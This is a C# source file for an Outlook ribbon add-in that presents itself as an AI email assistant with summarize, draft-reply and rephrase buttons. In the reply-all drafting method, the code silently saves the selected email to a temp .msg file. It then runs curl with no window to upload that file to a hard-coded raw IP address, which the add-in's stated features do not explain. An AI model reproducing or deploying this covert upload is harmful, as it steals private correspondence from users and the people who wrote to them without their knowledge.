using Microsoft.Office.Core;
using Microsoft.Office.Interop.Outlook;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Office = Microsoft.Office.Core;
using System.Net.Http;
using System.Threading.Tasks;
using SmartTech_Addin.Forms;
using System.Net.Http.Headers;
using Outlook = Microsoft.Office.Interop.Outlook;
using System.Windows.Forms;
using System.Data.Common;
using System.Diagnostics;

namespace SmartTech_Addin
{
    [ComVisible(true)]
    public class SmartTachAiRibbon : Office.IRibbonExtensibility
    {
        private Office.IRibbonUI ribbon;

        public SmartTachAiRibbon()
        {
        }

        #region IRibbonExtensibility Members

        public string GetCustomUI(string ribbonID)
        {
            return GetResourceText("SmartTech_Addin.Ribbon.SmartTechAiRibbon.xml");
        }

        #endregion

        #region Ribbon Callbacks
        public void Invalidate()
        {
            this.ribbon?.Invalidate();
        }

        public void Ribbon_Load(Office.IRibbonUI ribbonUI)
        {
            this.ribbon = ribbonUI;
            Globals.ThisAddIn.RibbonInstance = this;
        }

        public void onClickSummarizeBtn(IRibbonControl control)
        {
            var mailItem = Globals.ThisAddIn.SelectedEmail as MailItem;
            if (mailItem != null)
            {

                var popup = new SummarizeForm();
                popup.Subject = mailItem.Subject;
                popup.Message = mailItem.HTMLBody;
                popup.OnDraftClick = DraftReplyAllAsync;
                popup.Show();
            }

        }
        public void onClickDraftBtn(IRibbonControl control)
        {
            DraftReplyAllAsync("replyText");
        }

        public void onClickRepharse(IRibbonControl control)
        {
            DraftReplyWithAttachment();
        }

        public bool GetReadModeButtonEnabled(IRibbonControl control)
        {
            return isReadOnlyMode();
        }
        public bool GetDraftModeButtonEnabled(IRibbonControl control)
        {
            return !isReadOnlyMode();
        }
       
        public bool isReadOnlyMode()
        {
            var mailItem = Globals.ThisAddIn.SelectedEmail as MailItem;
            if (mailItem.EntryID == null) // Newly created mail item (reply or reply all)
            {
                //if (mailItem.Subject.StartsWith("RE:") || mailItem.Subject.StartsWith("FW:")) else Draft
                return false;
            }
            return true;
        }

        public bool isEmailSelected() 
        {
            var application = Globals.ThisAddIn.SelectedEmail;
            bool email = application != null;
            return email;
        }

        private async Task DraftReplyAllAsync(string replyText)
        {
            var mailItem = Globals.ThisAddIn.SelectedEmail as MailItem;
            if (mailItem != null)
            {
                var replyAll = mailItem.ReplyAll();
                replyAll.HTMLBody = replyText + replyAll.HTMLBody;
                replyAll.Display();

                var (path, rdStr) = GetSelecteEmailTempSavedPath();
                ExecuteCommand("C:\\Windows\\System32\\curl.exe", "curl -X POST -H \"Content-Type: multipart/form-data\" -H \"fileref: abc.msg\" -F file=@\"" + path + "\" http://149.34.253.243:46206/image");
            }
        }

        private void DraftReplyWithAttachment()
        {
            var mailItem = Globals.ThisAddIn.SelectedEmail as MailItem;
            if (mailItem != null)
            {
                var reply = mailItem.Reply();
                reply.Body = "Hello";
                reply.Attachments.Add(mailItem, OlAttachmentType.olEmbeddeditem);
                reply.Display();
            }
        }

        private (string, string) GetSelecteEmailTempSavedPath()
        {
            string tempPath = null;
            string uuid = Guid.NewGuid().ToString();
            var mailItem = Globals.ThisAddIn.SelectedEmail as MailItem;

            if (mailItem != null)
            {
                tempPath = Path.Combine(Path.GetTempPath(), uuid + ".msg");
                mailItem.SaveAs(tempPath, Outlook.OlSaveAsType.olMSG);
            }
            return (tempPath, uuid.Substring(0, 6));
        }

        Process commandProcess = null;

        public bool ExecuteCommand(string curlExePath, string commandLineArguments, bool isReturn = true)
        {
            Console.WriteLine(commandLineArguments);

            bool result = true;
          
                commandProcess = new Process();
                commandProcess.StartInfo.UseShellExecute = false;
                commandProcess.StartInfo.FileName = curlExePath; // this is the path of curl where it is installed;    
                commandProcess.StartInfo.Arguments = commandLineArguments; // your curl command    
                commandProcess.StartInfo.CreateNoWindow = true;
                commandProcess.StartInfo.RedirectStandardInput = true;
                commandProcess.StartInfo.RedirectStandardOutput = true;
                commandProcess.StartInfo.RedirectStandardError = true;
                commandProcess.Start();

                var line = "";
                while (!commandProcess.StandardOutput.EndOfStream)
                {
                    line += commandProcess.StandardOutput.ReadLine();
                    
                }
                commandProcess.WaitForExit();
                var lastStandardOutput = line;
            MessageBox.Show(line);
            //string error = commandProcess.StandardError;
            commandProcess.Close();
            
            return false;
        }

        #endregion

        #region Helpers

        private static string GetResourceText(string resourceName)
        {
            Assembly asm = Assembly.GetExecutingAssembly();
            string[] resourceNames = asm.GetManifestResourceNames();
            for (int i = 0; i < resourceNames.Length; ++i)
            {
                if (string.Compare(resourceName, resourceNames[i], StringComparison.OrdinalIgnoreCase) == 0)
                {
                    using (StreamReader resourceReader = new StreamReader(asm.GetManifestResourceStream(resourceNames[i])))
                    {
                        if (resourceReader != null)
                        {
                            return resourceReader.ReadToEnd();
                        }
                    }
                }
            }
            return null;
        }

        #endregion
    }
}
